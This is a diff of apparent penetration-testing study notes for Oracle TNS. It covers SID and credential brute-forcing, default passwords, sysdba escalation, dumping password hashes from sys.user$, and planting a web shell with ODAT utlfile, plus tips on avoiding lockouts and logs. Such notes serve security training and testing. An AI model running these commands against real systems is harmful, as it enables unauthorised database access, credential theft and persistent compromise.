@@ -1,122 +1,77 @@
-1. Identify Oracle TNS on TCP/1521 and confirm it is **unauthorized** or open.
-2. Enumerate the **SID** (System Identifier) using Nmap scripts or ODAT.
-3. Bruteforce credentials using ODAT `all` or specific guessing modules.
-4. Access the instance via `sqlplus` using discovered credentials and the SID.
-5. Attempt elevation to **sysdba** to bypass standard user restrictions.
-6. Extract password hashes from the **sys.user$** table for offline cracking.
-7. If a web server is present, leverage `utlfile` via ODAT to drop a web shell.
+# Oracle TNS — Footprinting
+
+Port TCP/1521. Requires SID to connect — enumerate it before trying creds. Default creds to always try: `scott/tiger`, `dbsnmp/dbsnmp`, `change_on_install` (Oracle 9 only).
+
+Config files if you get file read: `$ORACLE_HOME/network/admin/tnsnames.ora` (client-side service definitions) and `listener.ora` (server-side listener config).
 
 ---
 
-## Service Discovery
+### Enumeration Chain
 
-Standard TNS listener detection when TCP/1521 is open.
+Nmap — version + confirm port open:
 
-Initial scan to confirm service version and basic status
-
-```
-sudo nmap -p<PORT> -sV <TARGET_IP> --open
+```bash
+sudo nmap -p1521 -sV <TARGET> --open
 ```
 
-## SID Enumeration
+Brute-force SID — required before connecting:
 
-TCP/1521 is open but the specific database instance name is unknown. **Incorrect SID** prevents any further connection or authentication attempts.
-
-Brute force the SID using Nmap
-
-```
-sudo nmap -p1521 -sV <TARGET_IP> --open --script oracle-sid-brute
+```bash
+sudo nmap -p1521 -sV <TARGET> --open --script oracle-sid-brute
 ```
 
-> ⚠️ Gap: Authentication will fail silently if the SID is not specified or guessed correctly, as Oracle requires the SID to route the connection to the correct memory structure.
+ODAT all modules — cred brute, SID enum, privesc checks, file upload test in one run:
 
-## Credential Guessing
-
-SID is known and the listener is confirmed reachable.
-
-Run all ODAT modules to find valid users and passwords
-
-```
-./odat.py all -s <TARGET_IP>
+```bash
+./odat.py all -s <TARGET>
 ```
 
-- Nmap: Use for initial discovery and quick SID scripts.
-    
-- ODAT: Use for comprehensive service-wide guessing and specific exploitation modules.
-    
-- Oracle 9 default: `CHANGE_ON_INSTALL`.
-    
-- Oracle DBSNMP default: `dbsnmp`.
-    
+---
 
-## Database Interaction
+### Connect
 
-Valid credentials and SID are acquired.
+Standard user:
 
-Connect to the instance to run manual queries
-
-```
-sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SERVICE_NAME>
+```bash
+sqlplus <USER>/<PASS>@<TARGET>/<SID>
 ```
 
-List all tables available to the current user
+As sysdba (if the account has the privilege — always try after getting any creds):
 
+```bash
+sqlplus <USER>/<PASS>@<TARGET>/<SID> as sysdba
 ```
+
+---
+
+### Enumeration Queries
+
+```sql
 select table_name from all_tables;
-```
-
-Check current user roles and permissions
-
-```
 select * from user_role_privs;
-```
-
-> ⚠️ Gap: `sqlplus` often fails on Linux due to missing shared libraries. If `libsqlplus.so` is not found, the library path must be added to the system configuration.
-
-Fix missing shared library errors
-
-```
-sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
-sudo ldconfig
-```
-
-## Administrative Access
-
-Authenticated as a low-privileged user like `scott`.
-
-Attempt to log in with **sysdba** privileges
-
-```
-sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SERVICE_NAME> as sysdba
-```
-
-## Credential Extraction
-
-Logged in with high privileges (sysdba).
-
-Query the system table for usernames and password hashes
-
-```
 select name, password from sys.user$;
 ```
 
-## File System Interaction
+`sys.user$` → Oracle password hashes → crack offline. Hash format is DES-based for older versions, SHA-based for 11g+.
 
-Valid credentials (ideally sysdba) exist and the target is likely hosting a web service.
+---
 
-Upload a test file or web shell to a known web root
+### File Upload → Webshell
 
-```
-./odat.py utlfile -s <TARGET_IP> -d <SERVICE_NAME> -U <USERNAME> -P <PASSWORD> --sysdba --putFile <FILE_PATH> <FILE_NAME> ./<LOCAL_FILE>
-```
+Upload via odat `utlfile` module — requires sysdba. Try web root paths:
 
-- Linux: `/var/www/html`.
-- Windows: `C:\inetpub\wwwroot`.
-
-Verify file upload success via web request
-
-```
-curl -X GET http://<TARGET_IP>/<FILE_NAME>
+```bash
+./odat.py utlfile -s <TARGET> -d <SID> -U <USER> -P <PASS> --sysdba --putFile C:\\inetpub\\wwwroot <REMOTEFILE> ./<LOCALFILE>
 ```
 
-> ⚠️ Gap: `utlfile` exploitation will fail if the exact **root directory** for the web server is not provided or if the server is not running a web service.
+Confirm write worked:
+
+```bash
+curl -X GET http://<TARGET>/<REMOTEFILE>
+```
+
+Linux web root: `/var/www/html`. Windows web root: `C:\inetpub\wwwroot`.
+
+> [!tip] `scott/tiger` is the classic default — ODAT will find it automatically, but try it manually first since ODAT's full scan takes a long time. Once you have any creds, immediately try `as sysdba` — non-obvious accounts are often granted it by lazy admins.
+
+> [!warning] ODAT `all` runs credential brute force — will generate auth failure logs and may trigger lockout if account lockout is configured. Run `sidguesser` and `passwordguesser` separately with controlled wordlists if you need to stay quiet.
